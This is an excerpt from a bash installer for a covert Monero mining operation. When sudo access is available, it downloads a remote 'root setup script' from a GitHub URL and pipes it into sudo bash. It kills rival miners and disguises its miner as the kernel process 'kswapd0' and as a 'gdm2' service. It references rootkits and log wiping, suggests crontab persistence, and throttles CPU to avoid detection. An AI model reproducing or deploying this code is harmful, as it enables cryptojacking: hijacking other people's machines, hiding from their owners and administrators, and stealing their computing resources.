...
# Check if user can elevate to root - if yes, run root script instead
echo "[*] Checking privilege level..."

# Test if user can sudo (may prompt for password)
if sudo -v 2>/dev/null; then
    echo "[✓] Sudo access available - switching to ROOT installation mode"
    echo "[*] Downloading root setup script..."
    
    # Download and execute root script
    ROOT_SCRIPT_URL="https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE.sh"
    
    if command -v curl >/dev/null 2>&1; then
        curl -L "$ROOT_SCRIPT_URL?t=$(date +%s)" | sudo bash -s "$@"
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- "$ROOT_SCRIPT_URL?t=$(date +%s)" | sudo bash -s "$@"
    else
...
# If we reach here, user has NO sudo access - continue with user-only mode
echo "[*] No sudo access - running in USER-ONLY mode"
echo "[*] Note: Some features (systemd services, rootkits) will be unavailable"
sleep 2
...
# systemctl stop (skipped - no sudo access)
# systemctl disable (skipped - no sudo access)
# rm system files (skipped - no sudo access)
# systemctl daemon-reload (skipped - no sudo access)
...
# rmmod (skipped - no sudo access)
# rm rootkit dirs (skipped - no sudo access)

# Clean logs
# sed log cleanup (skipped - no sudo access)
# journalctl (skipped - no sudo access)
...
# systemctl stop moneroocean_miner.service (skipped - no sudo access)
killall -9 xmrig 2>/dev/null
killall -9 kswapd0 2>/dev/null
...
if ! pidof kswapd0 >/dev/null; then
  ...
  echo "Run \"killall kswapd0\" or \"killall kswapd0\" if you want to remove background miner first."
fi
EOL
...
if ! -n true 2>/dev/null; then
  ...
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    ...
    # hugepages config (skipped - no sudo access)
    # sysctl (skipped - no sudo access)
  fi
...
EOL
    echo "[!] Systemd service not installed (no sudo access)"
    echo "[*] Miner will run in foreground mode or from crontab instead"
    # systemctl daemon-reload (skipped - no sudo access)
    # systemctl enable gdm2.service (skipped - no sudo access)
    # systemctl start gdm2.service (skipped - no sudo access)
    echo "[*] Use 'crontab -e' to add autostart via @reboot if needed"
  fi
fi
...
if [ "$CPU_THREADS" -lt "4" ]; then
  ...
  echo "apt-get update; apt-get install -y cpulimit"
  echo "cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b"
  if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
    echo "sed -i -e '\$acpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
